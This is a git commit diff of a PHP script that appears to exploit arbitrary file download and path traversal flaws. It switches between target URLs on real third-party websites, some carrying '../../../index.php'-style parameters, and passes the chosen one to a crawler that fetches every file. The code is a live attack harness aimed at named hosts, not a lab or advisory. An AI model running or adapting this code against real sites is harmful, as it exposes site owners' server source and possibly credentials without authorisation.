57e7e083a19ff2b006614a7ff72a0f80581e1ccd
lenonleite <lenonleite@gmail.com>
2016-07-06 09:07:11 -0300

    downloading file

--- index.php
+++ index.php
@@ -11,9 +11,9 @@ use Aszone\CrawlerStaticFile\CrawlerStaticFil;
 require_once __DIR__ . '/vendor/autoload.php';
 
 $command=array();
-$file="http://www.bva.com.es/servicios/ce/archivos/download.php?file=../../../index.php";
+//$file="http://www.bva.com.es/servicios/ce/archivos/download.php?file=../../../index.php";
 $file="http://www.pcmodd.com.ar/downloadFile.php?file=index.php";
-$file="http://uthgraloscocos.com.ar/site/descargar.php?ruta=..//site/index.php&archivo=";
+//$file="http://uthgraloscocos.com.ar/site/descargar.php?ruta=..//site/index.php&archivo=";
 $crawler = new CrawlerStaticFil($command,$file);
 
 $crawler->getAllFiles();
